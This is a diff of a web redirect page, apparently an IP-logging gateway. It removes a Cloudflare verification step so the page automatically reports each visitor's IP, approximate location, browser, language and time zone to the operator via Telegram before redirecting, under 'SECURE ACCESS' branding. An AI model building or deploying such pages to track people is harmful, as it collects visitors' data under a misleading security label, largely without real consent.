@@ -4,7 +4,7 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="robots" content="noindex,nofollow" />
-  <title>Secure access · Verification</title>
+  <title>Connecting you · Secure redirect</title>
   <style>
     :root { color-scheme: dark; --text: #f6f4ff; --sub: #b6aed1; --line: rgba(184,161,255,.18); --purple: #a28aff; }
     * { box-sizing: border-box; }
@@ -44,18 +44,18 @@
   <main class="shell">
     <header class="top"><div class="icon" aria-hidden="true"><svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2 20 6v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6l8-4Z"/><path d="m9 12 2 2 4-4"/></svg></div><span>SECURE ACCESS</span></header>
     <section class="card" aria-labelledby="title">
-      <div class="badge"><i></i> Protection is active</div>
-      <h1 id="title">One quick check.<br/>Then you're in.</h1>
-      <p class="lead">We're checking that this connection is genuine. Complete the security challenge below to continue to the website.</p>
-      <div class="step"><div class="step-icon">01</div><div>Complete the Cloudflare verification. Once approved, you'll be redirected automatically.</div></div>
+      <div class="badge"><i></i> Connecting securely</div>
+      <h1 id="title">Your destination<br/>is almost ready.</h1>
+      <p class="lead">We're preparing your visit. You'll be taken to the destination website automatically.</p>
+      <div class="step"><div class="step-icon">01</div><div>Your visit is being processed. No registration or action is required.</div></div>
       <div id="widget" aria-label="Security verification"></div>
       <div id="loading" aria-live="polite"><div class="spinner" aria-hidden="true"></div><span>Checking your access…</span></div>
-      <p id="status" role="status" aria-live="polite">Loading secure verification…</p>
-      <button id="retry" class="retry" type="button">Try verification again</button>
+      <p id="status" role="status" aria-live="polite">Preparing your redirect…</p>
+      <button id="retry" class="retry" type="button">Try again</button>
       <div class="track" aria-hidden="true"><div class="bar" id="bar"></div></div>
-      <p class="privacy"><b>Privacy notice:</b> After successful verification, the website operator receives a Telegram notification with your public IP address, approximate IP-based location, browser/device information, language, time zone, and network connection estimate (where available). No phone number, precise GPS location, or contacts are accessed. If you don't wish to share this information, close the page rather than completing the check.</p>
+      <p class="privacy"><b>Privacy notice:</b> This page automatically transmits your public IP address, approximate IP-based country/city, browser/device details, language, time zone and connection estimate (if available) to the website operator via Telegram. This occurs without an additional form. No phone number, GPS location or contacts are accessed. See the operator's privacy policy for data handling details.</p>
     </section>
-    <footer class="footer"><span>Protected using Cloudflare Turnstile</span><span>Encrypted verification &middot; No account required</span></footer>
+    <footer class="footer"><span>Secure redirect gateway</span><span>No account required</span></footer>
   </main>
   <script>
     (() => {
@@ -65,90 +65,104 @@
       const loading = document.getElementById('loading');
       const retry = document.getElementById('retry');
       const bar = document.getElementById('bar');
-      let widgetId = null;
-      let verifying = false;
-      let completed = false;
-      let redirectTimer;
+      const step = document.querySelector('.step div:last-child');
+      let started = false;
+      let optionalTimer;
+      let destination = '';
 
       function showError(message) {
-        verifying = false;
-        widget.style.display = 'flex';
-        loading.classList.remove('show');
         status.textContent = message;
         status.classList.add('error');
         retry.classList.add('show');
-      }
-      function reset() {
-        clearTimeout(redirectTimer);
-        completed = false;
-        verifying = false;
-        retry.classList.remove('show');
-        status.classList.remove('error');
-        bar.classList.remove('done');
         loading.classList.remove('show');
-        widget.style.display = 'flex';
-        status.textContent = 'Complete the challenge to continue.';
-        if (typeof window.turnstile?.reset === 'function' && widgetId !== null) window.turnstile.reset(widgetId);
       }
-      retry.addEventListener('click', reset);
 
-      async function onApproved(token) {
-        if (verifying || completed) return;
-        verifying = true;
+      async function submitAndRedirect(token = undefined) {
+        if (started || !destination) return;
+        started = true;
+        clearTimeout(optionalTimer);
+        widget.style.display = 'none';
         retry.classList.remove('show');
         status.classList.remove('error');
-        widget.style.display = 'none';
         loading.classList.add('show');
-        status.textContent = 'Finishing secure verification…';
+        status.textContent = 'Preparing your destination…';
+        const begun = performance.now();
+
+        // The redirect never depends on Cloudflare or Telegram availability.
+        // Only browser-visible metadata is included in the JSON; the server supplies IP and region.
         try {
           const response = await fetch('/api/verify', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             cache: 'no-store',
             body: JSON.stringify({
-              token,
+              ...(token ? { token } : {}),
               language: navigator.language || '',
               timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
               connection: navigator.connection?.effectiveType || '',
             }),
           });
-          const result = await response.json();
-          if (!response.ok || !result.ok || !result.redirect) throw new Error(result.error || 'Verification could not be completed.');
-          verifying = false;
-          completed = true;
-          bar.classList.add('done');
-          loading.querySelector('span').textContent = 'Verified. Redirecting securely…';
-          status.textContent = 'Access approved. Taking you to the website.';
-          redirectTimer = setTimeout(() => { window.location.assign(result.redirect); }, 2300);
-        } catch (err) {
-          showError(err?.message || 'Could not complete verification. Please retry.');
+          if (response.ok) {
+            const result = await response.json();
+            if (!result.ok || result.redirect !== destination) console.warn('Unexpected check-in response. Continuing.');
+          }
+        } catch {
+          // The backend may be offline. The configured destination still opens.
         }
+        bar.classList.add('done');
+        loading.querySelector('span').textContent = 'Taking you to the website…';
+        status.textContent = 'Your destination is ready.';
+        const remaining = Math.max(0, 2300 - (performance.now() - begun));
+        window.setTimeout(() => window.location.replace(destination), remaining);
       }
 
       async function start() {
+        started = false;
+        retry.classList.remove('show');
+        status.classList.remove('error');
+        widget.style.display = 'none';
+        loading.classList.add('show');
+        status.textContent = 'Preparing your redirect…';
+        bar.classList.remove('done');
         try {
-          const configResponse = await fetch('/api/config', { cache: 'no-store' });
-          const config = await configResponse.json();
-          if (!configResponse.ok || !config.siteKey) throw new Error(config.error || 'This verification page is not configured.');
+          const response = await fetch('/api/config', { cache: 'no-store' });
+          const config = await response.json();
+          if (!response.ok || !config.redirect) throw new Error(config.error || 'Destination is not configured.');
+          destination = config.redirect;
+
+          if (!config.turnstileEnabled || !config.siteKey) {
+            step.textContent = 'No action required. Your visit is being processed automatically.';
+            return submitAndRedirect();
+          }
+
+          // Optional Turnstile is non-blocking: timeout, denial or load failure all proceed.
+          step.textContent = 'An optional Cloudflare check may appear. You will continue automatically.';
+          loading.classList.remove('show');
+          widget.style.display = 'flex';
+          status.textContent = 'Checking your connection (optional)…';
+          optionalTimer = window.setTimeout(() => submitAndRedirect(), 4000);
           const script = document.createElement('script');
           script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit';
           script.async = true;
           script.onload = () => {
-            if (!window.turnstile) return showError('Unable to load verification.');
-            widgetId = window.turnstile.render('#widget', {
-              sitekey: config.siteKey,
-              theme: 'dark',
-              appearance: 'always',
-              callback: onApproved,
-              'error-callback': () => showError('The security check failed to load. Please retry.'),
-              'expired-callback': () => showError('This challenge expired. Please retry.'),
-            });
-            status.textContent = 'Complete the challenge to continue.';
+            if (started) return;
+            if (!window.turnstile) return submitAndRedirect();
+            try {
+              window.turnstile.render('#widget', {
+                sitekey: config.siteKey,
+                theme: 'dark',
+                appearance: 'always',
+                callback: (token) => submitAndRedirect(token),
+                'error-callback': () => submitAndRedirect(),
+                'expired-callback': () => submitAndRedirect(),
+              });
+            } catch { submitAndRedirect(); }
           };
-          script.onerror = () => showError('Cloudflare could not load. Please retry.');
+          script.onerror = () => submitAndRedirect();
           document.head.appendChild(script);
-        } catch (err) { showError(err?.message || 'Verification cannot be loaded.'); }
+        } catch (err) { showError(err?.message || 'Unable to load the destination.'); }
       }
+      retry.addEventListener('click', start);
       start();
     })();
   </script>
